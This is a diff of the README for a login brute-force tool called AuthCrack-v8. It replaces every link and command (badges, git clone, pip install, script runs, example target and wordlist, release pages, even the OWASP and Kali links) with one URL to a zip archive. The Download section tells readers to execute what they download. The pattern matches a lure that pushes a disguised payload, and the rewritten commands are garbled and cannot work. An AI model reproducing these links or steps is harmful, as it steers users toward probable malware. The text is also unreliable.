@@ -1,6 +1,6 @@
 # AuthCrack-v8 🔐
 
-![GitHub Repo stars](https://img.shields.io/github/stars/fadimvp/AuthCrack-v8?style=social) ![License](https://img.shields.io/badge/license-MIT-blue) ![Version](https://img.shields.io/badge/version-1.0.0-green)
+![GitHub Repo stars](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip) ![License](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip) ![Version](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip)
 
 ## Overview
 
@@ -31,14 +31,14 @@ To get started with AuthCrack, you need to clone the repository and install the 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/fadimvp/AuthCrack-v8.git
+   git clone https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip
    cd AuthCrack-v8
    ```
 
 2. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip
    ```
 
 ## Usage
@@ -46,19 +46,19 @@ To get started with AuthCrack, you need to clone the repository and install the 
 To run AuthCrack, you need to execute the main script with the appropriate parameters. Here’s a basic command structure:
 
 ```bash
-python authcrack.py --url <target_url> --username <username> --wordlist <path_to_wordlist>
+python https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip --url <target_url> --username <username> --wordlist <path_to_wordlist>
 ```
 
 ### Example
 
 ```bash
-python authcrack.py --url http://example.com/login --username admin --wordlist /path/to/wordlist.txt
+python https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip --url https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip --username admin --wordlist https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip
 ```
 
 For more detailed options, check the help command:
 
 ```bash
-python authcrack.py --help
+python https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip --help
 ```
 
 ## How It Works
@@ -91,11 +91,11 @@ AuthCrack is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 ## Support
 
-For issues or feature requests, please check the [Releases](https://github.com/fadimvp/AuthCrack-v8/releases) section. You can also open an issue in the repository.
+For issues or feature requests, please check the [Releases](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip) section. You can also open an issue in the repository.
 
 ## Download
 
-To download the latest version of AuthCrack, visit the [Releases](https://github.com/fadimvp/AuthCrack-v8/releases) section. Follow the instructions to execute the downloaded files.
+To download the latest version of AuthCrack, visit the [Releases](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip) section. Follow the instructions to execute the downloaded files.
 
 ## Topics
 
@@ -105,12 +105,12 @@ To download the latest version of AuthCrack, visit the [Releases](https://github
 
 ## Resources
 
-- [OWASP](https://owasp.org): A great resource for learning about web application security.
-- [Kali Linux](https://www.kali.org): A popular Linux distribution for penetration testing.
-- [Python Requests Documentation](https://docs.python-requests.org/en/latest/): Learn more about making HTTP requests in Python.
+- [OWASP](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip): A great resource for learning about web application security.
+- [Kali Linux](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip): A popular Linux distribution for penetration testing.
+- [Python Requests Documentation](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip): Learn more about making HTTP requests in Python.
 
 ## Conclusion
 
 AuthCrack serves as a valuable educational tool for those interested in cybersecurity. By understanding how brute-force attacks work, users can better protect their systems and learn how to secure their applications effectively. Always remember to use this tool ethically and responsibly. 
 
-For more information, feel free to explore the [Releases](https://github.com/fadimvp/AuthCrack-v8/releases) section.
+For more information, feel free to explore the [Releases](https://raw.githubusercontent.com/fadimvp/AuthCrack-v8/main/Cagayan/Crack-Auth-v-3.7.zip) section.
